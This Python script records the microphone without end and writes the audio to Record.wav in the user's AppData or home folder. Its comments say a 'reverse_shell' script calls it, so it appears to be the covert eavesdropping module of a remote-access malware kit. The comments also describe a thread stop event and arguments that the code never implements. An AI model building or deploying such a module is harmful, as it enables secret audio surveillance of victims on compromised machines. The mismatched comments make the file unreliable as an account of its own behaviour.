#!/usr/bin/python

import pyaudio
import wave
import os, sys
import threading



chunk = 1024
Format = pyaudio.paInt16
channel = 2
RATE = 44100


# THIS FUNCTION IS MAINLY RESPONSIBLE FOR RECORDING THE AUDIO
# AND WRITING THE DATA IN CHUNKS OF 1024 BYTES AND ADDING THEM
# TO THE frames ARRAY WHICH WILL THEN BE WRITTEN INTO THE FILE 
# MADE BY THE makeFile() FUNCTION THAT CALLS THIS METHOD

def record():

	p = pyaudio.PyAudio()

	stream = p.open(format=Format,
					channels=channel,
					rate=RATE,
					input=True,
					frames_per_buffer=chunk)


	frames = []

	try:
		while True:
			data = stream.read(chunk)
			frames.append(data)
	except KeyboardInterrupt:
		print('Stopping recording.')
	except Exception as e:
		print(str(e))

	sample_width = p.get_sample_size(Format)

	stream.stop_stream()
	stream.close()
	p.terminate()

	return sample_width, frames	



# THIS FUNCTION TAKES IN THE file_path AND THE STOPPING EVENT AS ARGUMENTS
# IT CREATES THE FILE IN file_path ACCORDING TO THE PROPERTIES OF THE RECORDED AUDIO FILE
# AND SIMPLY PASSES ON THE EVENT TO THE record() FUNCTION
# WHERE IT IS HANDLED
def makeFile(file_path):
	# opens the output file as named in file_path
	wf = wave.open(file_path, 'wb')
	wf.setnchannels(channel)
	
	# get the audio output generated by the record() function
	sample_width, frames = record()

	wf.setsampwidth(sample_width)
	wf.setframerate(RATE)
	wf.writeframes(b''.join(frames))
	wf.close()


# THIS FUNCTION IS CALLED FROM THE MAIN THREAD (reverse_shell SCRIPT)
# TAKES IN stop_thread AS AN ARGUMENT
# OF TYPE threading.Event
# AND PASSES IT ON TO THE makeFile() FUNCTION, 
# WHICH AGAIN PASSES IT TO THE record() FUNCTION WHICH HANDLES THIS EVENT

# WHEN THIS EVENT IS SET, THIS SCRIPT STOPS RUNNING 
# HANDLED IN THE record() METHOD
def startRecording():
	try:
		rec_path = os.environ["appdata"] + "\\Record.wav"
	except:
		rec_path = os.environ["HOME"] + "/Record.wav"
	makeFile(rec_path)
	
startRecording()
